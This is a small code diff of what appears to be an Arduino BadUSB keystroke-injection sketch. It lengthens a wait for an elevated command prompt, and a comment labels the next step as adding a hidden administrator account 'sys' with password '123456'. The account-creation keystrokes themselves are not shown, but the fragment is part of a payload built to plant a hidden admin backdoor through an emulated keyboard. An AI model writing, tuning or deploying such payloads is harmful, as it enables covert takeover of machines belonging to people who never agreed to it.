@@ -25,7 +25,7 @@ void setup() {
   Keyboard.press('y');
   delay(500);
   Keyboard.releaseAll();
-  delay(2000);//延迟不宜过短，cmd初始化需要时间
+  delay(5000);//延迟不宜过短，cmd初始化需要时间
   
   // sys 123456 隐藏管理员添加
   Keyboard.press(KEY_LEFT_SHIFT);
